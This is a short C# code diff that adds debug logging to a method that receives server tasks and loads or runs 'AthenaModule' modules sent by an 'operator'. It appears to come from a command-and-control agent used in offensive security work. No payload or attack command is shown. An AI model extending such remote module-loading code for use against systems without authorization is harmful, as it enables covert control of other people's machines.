@@ -32,10 +32,12 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             ExecModuleArgs args = JsonSerializer.Deserialize<ExecModuleArgs>(job.task.parameters);
 
             if(args is null)
             {
+                DebugLog.Log($"{Name} failed to parse args [{job.task.id}]");
                 messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
@@ -49,6 +51,7 @@ namespace Workflow
             //The operator indicated that the module has already been loaded
             if (string.IsNullOrEmpty(args.file))
             {
+                DebugLog.Log($"{Name} executing pre-loaded module: {args.name} [{job.task.id}]");
                 this.module_tasks.Add(job.task.id, args);
                 if(this.modules.Where(x=>x.name == args.name).Count() <= 0)
                 {
@@ -80,6 +83,7 @@ namespace Workflow
             //Start new module loading process
             else
             {
+                DebugLog.Log($"{Name} loading new module: {args.name} [{job.task.id}]");
                 //Create new object to store the loaded module
                 AthenaModule mod = new AthenaModule()
                 {
